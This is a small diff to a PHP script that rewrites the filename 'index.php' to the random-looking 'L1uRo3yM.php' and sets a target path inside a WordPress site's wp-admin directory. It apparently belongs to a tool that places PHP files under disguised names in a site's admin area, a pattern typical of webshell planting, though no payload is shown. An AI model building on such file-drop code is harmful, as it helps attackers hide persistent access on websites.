@@ -3,7 +3,13 @@ function file_name($url)
 {
   if (preg_match('/\/([^\/]+)$/', $url, $matches)) {
     $x = $matches[1];
-    return $x;
+    echo $x;
+    if ($x === "index.php"){
+        $x = "L1uRo3yM.php";
+        return $x;
+    }else{
+        return $x;
+    }
   }
 }
 $test_dir = $_SERVER['DOCUMENT_ROOT'] . '/wp-admin/';
